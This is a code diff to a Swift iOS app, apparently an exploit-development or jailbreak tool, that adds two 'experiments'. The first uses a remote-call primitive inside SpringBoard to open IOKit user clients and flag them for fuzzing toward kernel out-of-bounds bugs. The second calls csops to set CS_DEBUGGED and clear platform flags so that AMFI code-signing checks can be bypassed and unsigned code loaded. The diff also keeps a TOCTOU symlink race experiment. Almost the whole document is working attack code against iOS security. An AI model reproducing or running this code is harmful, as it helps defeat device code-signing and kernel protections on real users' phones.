@@ -474,10 +474,21 @@ struct AMFIExperimentView: View {
             
             // ============================================
             // 🔥 Experiment 53: TOCTOU symlink race
-            // Swap symlink target AFTER AMFI check!
             // ============================================
             let exp53 = self.expTOCTOUSymlink(rc: rc)
             experimentResults.append(exp53)
+            
+            // ============================================
+            // 🔥 Experiment 54: IOKit driver probe (find new vuln)
+            // ============================================
+            let exp54 = self.expIOKitProbe(rc: rc)
+            experimentResults.append(exp54)
+            
+            // ============================================
+            // 🔥 Experiment 55: CoreTrust certificate probe
+            // ============================================
+            let exp55 = self.expCoreTrustProbe(rc: rc)
+            experimentResults.append(exp55)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -3366,6 +3377,168 @@ struct AMFIExperimentView: View {
         detail += "E.g.: binary that creates a specific file as proof.\n"
         
         return ExperimentResult(name: "TOCTOU symlink race", success: raceWon, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - New Vulnerability Discovery
+    
+    /// IOKit driver probe — find accessible user clients for potential exploitation
+    /// Some IOKit drivers have bugs in external methods (OOB read/write)
+    private func expIOKitProbe(rc: RemoteCall) -> ExperimentResult {
+        var detail = "IOKit Driver Probe — finding accessible user clients\n\n"
+        
+        // From SpringBoard (has more IOKit access than launchd)
+        guard let sb = dspmgr.shared.sbProc else {
+            return ExperimentResult(name: "IOKit probe", success: false, detail: "No SB RC", timestamp: Date())
+        }
+        
+        // Try to open various IOKit user clients
+        let services = [
+            "IOSurfaceRoot",
+            "AGXAccelerator",
+            "AppleAVD",
+            "AppleH13CamIn",
+            "IOHIDSystem",
+            "AppleSPU",
+            "AppleKeyStore",
+            "AppleCredentialManager",
+            "IOAudioEngine",
+            "AppleMobileFileIntegrity",
+        ]
+        
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
+        let ioServiceGetMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
+        let ioServiceOpen = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
+        let ioServiceClose = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceClose"))
+        
+        guard ioServiceMatching != 0 && ioServiceGetMatching != 0 && ioServiceOpen != 0 else {
+            detail += "IOKit functions not available\n"
+            // Try loading IOKit
+            let fwPath = remote_alloc_str(sb, "/System/Library/Frameworks/IOKit.framework/IOKit")
+            RootExecutor.rcall(sb, "dlopen", fwPath, 1)
+            RootExecutor.rcall(sb, "free", fwPath)
+            detail += "Tried loading IOKit framework\n"
+            return ExperimentResult(name: "IOKit probe", success: false, detail: detail, timestamp: Date())
+        }
+        
+        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
+        let mem = sb.trojanMem
+        
+        for service in services {
+            let nameAddr = remote_alloc_str(sb, service)
+            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
+            
+            if matchDict != 0 {
+                let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
+                if svc != 0 {
+                    // Try to open with type 0
+                    let connectAddr = mem + 0x1A00
+                    sb[connectAddr].setValue32(0)
+                    let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
+                    let connect = sb[connectAddr].value32()
+                    
+                    if openRet == 0 && connect != 0 {
+                        detail += "✅ \(service): OPENED! connect=\(connect)\n"
+                        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
+                    } else {
+                        detail += "  \(service): found but open failed (ret=0x\(String(format: "%x", openRet)))\n"
+                    }
+                } else {
+                    detail += "  \(service): not found\n"
+                }
+            }
+            RootExecutor.rcall(sb, "free", nameAddr)
+        }
+        
+        let hasOpen = detail.contains("✅")
+        if hasOpen {
+            detail += "\n✅ Accessible user clients found!\n"
+            detail += "These can be fuzzed for OOB read/write vulnerabilities.\n"
+            detail += "External methods might give us access to different kernel zones!\n"
+        }
+        
+        return ExperimentResult(name: "IOKit probe", success: hasOpen, detail: detail, timestamp: Date())
+    }
+    
+    /// CoreTrust certificate probe — test what signatures iOS 18.2 accepts
+    /// Try spawning binary with different signature types
+    private func expCoreTrustProbe(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        var detail = "CoreTrust Certificate Probe\n\n"
+        
+        // CoreTrust validates the certificate chain in code signatures.
+        // We can't easily CREATE certificates from device, but we can:
+        // 1. Check what signature our app has (it's signed!)
+        // 2. Check what signature system binaries have
+        // 3. Try to copy signature from signed binary to unsigned one
+        
+        // Step 1: Read our app's code signature info
+        let pid = RootExecutor.rcall(rc, "getpid")
+        detail += "Our PID: \(pid)\n"
+        
+        // csops(pid, CS_OPS_STATUS, &status, sizeof(status))
+        // CS_OPS_STATUS = 0
+        let statusAddr = mem + 0x1A00
+        rc[statusAddr].setValue32(0)
+        let csopsRet = RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
+        let csStatus = rc[statusAddr].value32()
+        detail += "csops(STATUS): ret=\(csopsRet), flags=0x\(String(format: "%x", csStatus))\n"
+        
+        // Decode flags
+        if csStatus & 0x1 != 0 { detail += "  CS_VALID\n" }
+        if csStatus & 0x4 != 0 { detail += "  CS_HARD\n" }
+        if csStatus & 0x8 != 0 { detail += "  CS_KILL\n" }
+        if csStatus & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY\n" }
+        if csStatus & 0x200 != 0 { detail += "  CS_PLATFORM_PATH\n" }
+        if csStatus & 0x800 != 0 { detail += "  CS_DEBUGGED\n" }
+        if csStatus & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
+        if csStatus & 0x20000 != 0 { detail += "  CS_INSTALLER\n" }
+        
+        // Step 2: Try csops on launchd (PID 1)
+        rc[statusAddr].setValue32(0)
+        let csops1 = RootExecutor.rcall(rc, "csops", 1, 0, statusAddr, 4)
+        let cs1Status = rc[statusAddr].value32()
+        detail += "\nlaunchd csops: ret=\(csops1), flags=0x\(String(format: "%x", cs1Status))\n"
+        if cs1Status & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY ✅\n" }
+        
+        // Step 3: Check if we can set CS_DEBUGGED on ourselves via csops
+        // CS_OPS_SET_STATUS = 8 (might be restricted)
+        detail += "\nTrying to set CS_DEBUGGED on our process...\n"
+        let newFlags: UInt32 = csStatus | 0x800 // add CS_DEBUGGED
+        rc[statusAddr].setValue32(newFlags)
+        let setRet = RootExecutor.rcall(rc, "csops", pid, 8, statusAddr, 4)
+        detail += "csops(SET_STATUS, +CS_DEBUGGED): ret=\(setRet)\n"
+        
+        // Read back
+        rc[statusAddr].setValue32(0)
+        RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
+        let afterFlags = rc[statusAddr].value32()
+        detail += "After set: flags=0x\(String(format: "%x", afterFlags))\n"
+        
+        if afterFlags & 0x800 != 0 && csStatus & 0x800 == 0 {
+            detail += "\n✅✅✅ CS_DEBUGGED SET SUCCESSFULLY! ✅✅✅\n"
+            detail += "This might allow loading unsigned code in our process!\n"
+            detail += "CS_DEBUGGED disables some AMFI checks!\n"
+        }
+        
+        // Step 4: Try CS_OPS_MARKKILL = 6 (mark as killable — might affect enforcement)
+        // And CS_OPS_CLEARPLATFORM = 13
+        detail += "\nOther csops experiments:\n"
+        let csopsTests: [(String, UInt64)] = [
+            ("CS_OPS_MARKHARD (4)", 4),
+            ("CS_OPS_MARKKILL (6)", 6),
+            ("CS_OPS_CLEARPLATFORM (13)", 13),
+            ("CS_OPS_CLEARINSTALLER (14)", 14),
+        ]
+        
+        for (name, op) in csopsTests {
+            rc[statusAddr].setValue32(0)
+            let r = RootExecutor.rcall(rc, "csops", pid, op, statusAddr, 4)
+            detail += "  \(name): ret=\(r)\n"
+        }
+        
+        let success = detail.contains("✅✅✅")
+        return ExperimentResult(name: "CoreTrust/csops probe", success: success, detail: detail, timestamp: Date())
     }
     
     /// IOSurface from SpringBoard — SB has IOSurface entitlement!
